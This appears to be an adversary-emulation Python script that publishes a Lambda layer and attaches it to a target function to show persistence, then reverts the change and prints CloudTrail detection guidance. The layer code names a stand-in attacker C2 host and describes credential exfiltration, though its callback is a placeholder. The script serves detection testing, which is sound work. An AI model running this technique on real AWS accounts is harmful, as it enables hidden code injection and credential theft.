"""
Technique : aws.persistence.lambda-layer-extension
Tactic    : Persistence (T1525)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.persistence.lambda-layer-extension/

Pre-requisites:
  - Run `pulumi up` in ../infra/ first to create the target Lambda function.

How the attack works:
  An attacker with lambda:PublishLayerVersion + lambda:UpdateFunctionConfiguration
  publishes a "malicious" Lambda layer and attaches it to a legitimate function.
  The layer's code executes alongside the function on every invocation, providing
  persistent code injection without modifying the function's own code or ZIP.

Detection signal:
  - lambda:PublishLayerVersion from an unexpected principal.
  - lambda:UpdateFunctionConfiguration adding a new/unexpected layer ARN.

Revert:
  - Automated: UpdateFunctionConfiguration to remove the layer.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import io
import json
import os
import subprocess
import time
import zipfile
from pathlib import Path

import boto3
from botocore.exceptions import ClientError


# ── Constants ─────────────────────────────────────────────────────────────────

LAYER_NAME   = "stratus-red-team-malicious-layer"
DWELL_TIME_S = 2

# Malicious layer code — in reality would phone home or steal creds
MALICIOUS_LAYER_CODE = """\
import os
import urllib.request

# Malicious layer — runs on every Lambda invocation
# In a real attack this would exfiltrate env vars, creds, etc.
_ATTACKER_C2 = os.environ.get("ATTACKER_C2", "http://attacker.example.com")

def _layer_init():
    pass  # Placeholder for C2 callback

_layer_init()
"""


# ── Helpers ───────────────────────────────────────────────────────────────────

def get_pulumi_outputs(stack_dir: str) -> dict:
    result = subprocess.run(
        ["pulumi", "stack", "output", "--json", "--show-secrets"],
        cwd=stack_dir,
        capture_output=True,
        text=True,
        env={**os.environ, "PULUMI_CONFIG_PASSPHRASE": os.environ.get("PULUMI_CONFIG_PASSPHRASE", "")},
    )
    if result.returncode != 0:
        print(f"[!] pulumi stack output failed: {result.stderr.strip()}")
        return {}
    return json.loads(result.stdout)


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}")
    print(f"  {msg}")
    print(f"{'=' * 60}")


def make_layer_zip() -> bytes:
    """Create a minimal Lambda layer ZIP containing a Python module."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("python/malicious_layer.py", MALICIOUS_LAYER_CODE)
    return buf.getvalue()


# ── Main ──────────────────────────────────────────────────────────────────────

def main(session: "boto3.Session") -> None:
    stack_dir     = str(Path(__file__).parent.parent / "infra")
    infra         = get_pulumi_outputs(stack_dir)
    function_name = infra.get("function_name", "stratus-red-team-layer-lambda")

    lambda_client = session.client("lambda")

    layer_arn: str | None = None
    layer_attached = False

    try:
        # ── Step 1: Publish malicious layer ───────────────────────────────────
        banner("Step 1 — Publish malicious Lambda layer (PublishLayerVersion)")
        layer_zip = make_layer_zip()
        response = lambda_client.publish_layer_version(
            LayerName=LAYER_NAME,
            Description="Stratus Red Team - malicious layer for adversary emulation",
            Content={"ZipFile": layer_zip},
            CompatibleRuntimes=["python3.12", "python3.11"],
        )
        layer_arn     = response["LayerVersionArn"]
        layer_version = response["Version"]
        print(f"  [+] Layer published: {LAYER_NAME} v{layer_version}")
        print(f"  [+] Layer ARN: {layer_arn}")
        print(f"  [!] CloudTrail event: lambda:PublishLayerVersion")

        # ── Step 2: Attach layer to function ──────────────────────────────────
        banner("Step 2 — Attach malicious layer to function (UpdateFunctionConfiguration)")
        lambda_client.update_function_configuration(
            FunctionName=function_name,
            Layers=[layer_arn],
        )
        layer_attached = True
        print(f"  [+] Layer attached to function: {function_name}")
        print(f"  [!] CloudTrail event: lambda:UpdateFunctionConfiguration")
        print(f"  [!] Malicious code will execute on every function invocation.")

        time.sleep(DWELL_TIME_S)

    finally:
        # ── Revert ────────────────────────────────────────────────────────────
        banner("Revert — Remove layer from function")
        if layer_attached:
            try:
                lambda_client.update_function_configuration(
                    FunctionName=function_name,
                    Layers=[],
                )
                print(f"  [+] Layer removed from function: {function_name}")
            except ClientError as exc:
                print(f"  [!] UpdateFunctionConfiguration (remove) failed: {exc}")

        if layer_arn:
            try:
                _, version_str = layer_arn.rsplit(":", 1)
                lambda_client.delete_layer_version(
                    LayerName=LAYER_NAME,
                    VersionNumber=int(version_str),
                )
                print(f"  [+] Layer version deleted: {layer_arn}")
            except (ClientError, ValueError) as exc:
                print(f"  [!] DeleteLayerVersion failed: {exc}")

    banner("Complete")
    print("CloudTrail events: lambda:PublishLayerVersion, lambda:UpdateFunctionConfiguration x2, lambda:DeleteLayerVersion")
    print("\nDetection guidance:")
    print("  Alert on lambda:UpdateFunctionConfiguration adding an unexpected layer.")
    print("\nRun `pulumi destroy` in ../infra/ to remove the Lambda function.")


if __name__ == "__main__":
    main(boto3.Session())


# ── MayaTrail Option-C entry point ─────────────────────────────────────────────

def _session_from_outputs(outputs: dict, region: str) -> boto3.Session:
    """Build a session from the worker-injected assumed-role creds (Option C);
    fall back to the ambient default session when run standalone."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def run(outputs: dict, region: str = "us-east-1") -> None:
    """Entry point called by the run_emulation_attack Celery task."""
    main(_session_from_outputs(outputs, region))
